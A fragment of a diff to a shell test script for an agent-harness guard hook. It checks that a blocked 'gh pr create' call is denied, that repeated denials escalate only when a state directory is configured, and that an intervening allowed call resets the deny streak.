 g "gh pr create refused on deepseek oneshot" block '{"tool_name":"terminal","tool_input":{"command":"gh pr create --fill"}}'
@@ -956,7 +956,7 @@ case "$out_noenv1$out_noenv2$out_noenv3" in
   *) echo "  ok: no PARITY_GUARD_STATE_DIR -> escalation stays a no-op" ;;
 esac
 
-# An intervening ALLOW breaks the streak (HIMMEL-2025 CR round 1, codex-2):
+# An intervening ALLOW breaks the streak:
 # denies counted "in a row" only -- an allowed call between two identical
 # denies means the run made progress, not that it is spinning.
 rm -rf "$TMP/deny-state"
